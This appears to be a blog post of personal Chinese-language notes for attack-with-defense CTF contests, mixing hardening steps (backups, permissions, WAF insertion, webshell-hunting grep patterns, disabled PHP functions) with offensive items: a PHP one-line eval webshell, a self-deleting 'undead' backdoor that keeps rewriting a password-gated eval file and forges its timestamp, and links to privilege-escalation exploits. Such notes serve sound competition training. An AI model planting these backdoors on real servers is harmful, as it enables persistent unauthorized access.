---
title: awd生存之道
date: 2020-12-01 00:32:53
tags: AWD生存之道
---

# 比赛开始阶段

常见漏洞的防御手段:https://www.freebuf.com/articles/web/208778.html

## 一、登陆SSH

**重点** 如果ssh的密码不是随机密码，记得一开始就进行密码更改，然后再接着操作。可以参照使用

赛前检测文件夹下的change_ssh_password.py文件，具体如下使用方法

如果不是随机密码，接着使用default_ssh.py进行扫描登陆，具体使用方法如下:

直接配置文件后，python运行即可

```
压缩 tar -czvf /tmp/backup.tar.gz /var/www/html
解压 tar -zxvf /tmp/backup.tar.gz
复原 cp -R /tmp/var/www/html/ . /var/www/html/
```

dump源码

```
scp -r -P Port remote_username@remote_ip:remote_folder local_file
```

记住把压缩包移出文件夹中

有时候会遇到压缩不不了了的情况，那样的话就只能拖出⽂文件夹重新开个会话窗⼝。

接着链接上图形化管理软件。

## 二 开始防护

### 上waf

```
find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?phpninclude('/tmp/waf.php');n/g"
```

**直接使用python脚本往上面加log.php改一下路径配置，就可以成功了。**需要更改的路径**/www/admin/localhost_80/wwwroot**

这里是将tmp目录下的waf.php批量安装到每一个php文件中（可以参考**log_t.php**  ）

### 禁止文件更改

还要将py文件中file_check.py运用起来进行联合攻击

```
chattr -R +i /etc
vi /home/www/kill.sh
```

```
#!/bin/sh
while :
do
rm -rf upload/*
done
```

```
chmod +x /home/www/kill.sh
```

然后运行杀文件

### 进行参数记录

- 后台默认密码

- 数据库密码(从web的config中查看)

- web⽬目录默认权限  
 ### 扫描网络拓补

  为攻击框架做准备，格式为`ip.txt`

## 三 信息收集

### 0x01 主机发现

#### nmap 简单使用

```
icmp扫描 nmap -sP 192.168.1.100-254
SYN扫描 -sS
```

awd 常用

```
nmap -sS -p {端口} ip/掩码 
```

#### masscan 简单使用

```
masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
```

scan some web ports on 10.x.x.x at 10kpps

```
masscan -p80 10.0.0.0/8 --banners -oB <filename>

```
• save results of scan in binary format to <filename>

```
masscan --open --banners --readscan <filename> -oX <savefile>
```

• read binary scan results in <filename> and save them as xml in <savefile

### 0x02 数据备份

#### web目录备份

使用webpack.sh

```
#！/bin/bash
time=`date +%d%k%M`
path="/var/www/html"
tar -zcvf /tmp/$time.tar.gz $path
```

然后编辑crontab

```
ctontab -e
20 * * * * ~/webpack.sh
```

#### 数据库打包

```
mysqldump -uroot -p --single-transaction --all-databases > back.sql
```

遇到枷锁就 sqlback.sh

```
#!/bin/bash
#mysql备份脚本
#备份目录
backupDir=/home/backup/database
#mysqlDump
mysqldump=/usr/local/mariadb/bin/mysqldump
#ip
host=127.0.0.1
username=root
password=123456
#日期
today=`date +%y%m%d`
#要备份的数据库
databases=(blog chin)
for database in $(databases[@])
	do
		echo "开始备份"$database
		$mysqldump -h$host
```

`crontab -e` 

恢复mysql

```
mysql -uroot -p password < bak.sql
```

修改sql密码（记得修改php）

```
update mysql.user set authentication_string=password('root') where user='root' and host='localhost';
flush privileges;
```

数据库降权(记得1修改配置文件)

```
create user 'dog'@'localhost' identified by '123456';
grant all on databasename.* to 'dog'@'localhost';
flush privileges;
```

其他

```
删库
drop databaseedusoho;
修改所有人的密码
update mysql.user set authentication_string=password('root');
update mysql.user set user='aaa' where user='root';
flush privileges;
grant all on dbname.* to 'dog'@'localhost';
```

#### 权限配置

对于非必须可以写的目录

```
find . -type d -writable | xargs chmod 755
```

需要文件读写设置777

```
文件夹修改为 755(能上传的目录为777）
find /var/www/html -type d -writable | xargs chmod 755
文件修改为 644
find /var/www/html -type f -writable | xargs chmod 644
```

再来一个.htaccess文件

```
<FilesMatch ".(php|php3|php4|php5|phtml)">
Order Allow,Deny
Deny from all
</FilesMatch>
```

## 四 清理内置webshell

```
find . -name "*.php" | xargs grep -n 'eval('
find . -name '*.php' | xargs grep -n 'eval('
find . -name '*.php' | xargs grep -n 'assert('
find . -name '*.php' | xargs grep -n 'system('
find . -name '*.php' | xargs grep -n 'shell_exec('
```

```
echo -en '<?php @eval($_POST[c]);?>\r<?php phpinfo();?>'>index.php
```

# 比赛进行时

## 一 攻击

### 上传phpinfo查看是否打开远程调试

```
xdebug.remote_enable = On
xdebug.remote_connect_back = On
```

### 代码审计

```
poc编写 使⽤用攻击框架
漏漏洞洞修补  修补正则
```

### 定向攻击

```
删库跑路
```

### 内存马（不死马）

### 混淆流量

### 漏洞类型

1.自带后门

webshell扫描

## 防护开始

### crontab 相关

添加

```
echo '' | crontab
```

删除

```
crontab -r
```

修改 -e

获取 -l

### 检查配置文件

**php.ini**  

```
auto_prepend_file = "/home/fdipzone/
header.php"
auto_append_file = "/home/fdipzone/
footer.php
```

**.htaccess**  

```
php_value auto_prepend_file "/home/fdipzone/
header.php"
php_value auto_append_file "/home/fdipzone/
footer.php"
```

**这种注意查杀**

文件上传的漏洞

### 查马

### 内存马（不死马）的抵制方法

```
ps -aux|grep 'www-data'|awk '{print $2}'|xargs kill -9
```

疯狂杀马

```
find . -name "*.php" -user "www-data" | xargs rm
```

杀马二重奏

```
rm *.php && mkdir *.php
```



### 一句话木马的查找

```
find /var/www/ -name "*.php" |xargs egrep
'assert|phpspy|c99sh|milw0rm|eval|
(gunerpress|(base64_decoolcode|spider_bc|
shell_exec|passthru|($_\POST[|eval
(str_rot13|.chr(|${"_P|eval($_R|
file_put_contents(.*$_|base64_decode
```

### php.ini设置

```
disable_functions=phpinfo,passthru,exec,syste
m,chroot,scandir,chgrp,chown,shell_exec,proc
_open,proc_get_status,ini_alter,ini_alter,ini_re
store,dl,pfsockopen,openlog,syslog,readlink,sy
mlink,popepassthru,stream_socket_server,get
_current_user,leak,putenv,popen,opendir
```

```
opendir,putenv
```

**设置“safe_mode”为“on”**  

**禁⽌止“open_basedir” 可以禁⽌止指定⽬目录之外的⽂文件操作**  

**expose_php设为off 这样php不不会在http⽂文件头中泄露露信息**  

**设置“allow_url_fopen”为“off” 可禁⽌止远程⽂文件功能**  

**log_errors”设为“on” 错误⽇日志开启**  

###  流量捕捉

在log_t.php这个waf之中有

https://blog.csdn.net/qq_43431158/article/details/103812601

https://github.com/rebeyond/Behinder

### 文件检测

使用`SimpleMonitor_64`文件

```
参数 -w + 监控的路径
```

### 提权poc

在getroot的这个文件夹下有提权poc，已经编译完毕。

```
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
```

exp收集

```
“<漏洞关键字> inurl:http://www.secbug.cn/bugs/”来搜索
cb.drops.wiki
https://exploits.shodan.io/
```

### 常用指令

```
top
ps aux | grep www-data
ps -u username | grep -v PID | awk '{print$1}' | xargs kill -9
pkill -kill -t <用户tty>
ps aux | grep pid/进程名字
#查看已经建立的网络连接以及进程
netstat -antulp | grep EST
#查看指定端口被哪个进程占用
lsof -i:端口号 或者 netstat -tunlp | grep 端口号
#结束进程命令
kill PID
killall <进程名>
kill - <PID>
find / *.php -perm 4777 //查找权限777的php文件
awk -F: '{if($3==0)print $1}' /etc/passwd //查看root权限用户
#检查所有tcp连接
netstat -ant | awk '{print $5 "\t" $6}' | grep "[1-9][0-9]*\." | sed -e 's/::ffff://' -e 's/:[0-9]*//' | sort | uniq -c | sort -rn
#查看指定目录下文件时间的排序
ls -alit | head -n 10
删除开头文件
rm -rf 'ls ^-'
rm -- -foo
rm ./-foo
```

```
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.3.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
//pass=pass
while (1){
file_put_contents($file,$code);
system('touch -m -d "2018-12-01 09:10:12" .3.php');
usleep(5000);
}
?>
```

![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/cefc1e178a82b9010f8a584f638da9773912efa3)

![image-20211230162736950](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230162736950.png)

后面的网卡可以先看一下重复的时候是怎么写的的，后面的接口不用写，应该是自动分配
